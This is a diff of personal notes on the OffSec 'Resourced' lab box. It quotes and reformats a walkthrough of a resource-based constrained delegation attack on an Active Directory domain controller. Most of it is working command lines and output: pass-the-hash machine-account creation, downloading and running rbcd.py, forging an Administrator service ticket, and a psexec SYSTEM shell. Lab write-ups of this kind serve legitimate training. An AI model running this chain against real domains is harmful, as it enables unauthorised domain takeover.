@@ -355,7 +355,26 @@ Ethernet adapter Ethernet0 2:
 ![[Pasted image 20260714051902.png]]
 
 ```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
+└─$ cp /usr/share/sharphound/SharpHound.exe . 
+```
 
+![[Pasted image 20260717052948.png]]
+
+```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
+└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.238.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+```
+
+```zsh
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+
+Path Owner                  Access
+---- -----                  ------
+     BUILTIN\Administrators resourced\ATTACK$ Allow
 ```
 
 ```zsh
@@ -374,6 +393,13 @@ Ethernet adapter Ethernet0 2:
 
 ```
 
+```zsh
+
+```
+
+```zsh
+
+```
 
 <details markdown="1">
 <summary>Walkthrough</summary>
@@ -672,7 +698,7 @@ Resource Based Constrained Delegation
 Let's use our access with the l.livingstone account to create a new machine account on the domain. We can do with by using impacket-addcomputer.
 ```
 
-```
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -696,10 +722,13 @@ UserPrincipalName :
 With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of rbcd.py and use it to set msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account.
 ```
 
-```
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
 ...
+```
+
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -714,14 +743,21 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Delegation rights modified succesfully!
 [*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
 We can confirm that this was successful by using our evil-winrm session.
+```
 
+```powershell
 *Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
 
 Path Owner                  Access
 ---- -----                  ------
      BUILTIN\Administrators resourced\ATTACK$ Allow
-We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.
+```
 
+```
+We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.
+```
+
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -732,14 +768,20 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*]     Requesting S4U2Proxy
 [*] Saving ticket in Administrator.ccache
 This saved the ticket on our Kali host as Administrator.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this file.
+```
 
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ export KRB5CCNAME=./Administrator.ccache
 Now, all we have to do is add a new entry in /etc/hosts to point resourcedc.resourced.local to the target IP address and run impacket-psexec to drop us into a system shell.
+```
 
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'
+```
 
+```zsh
 ┌──(kali㉿kali)-[~]
 └─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
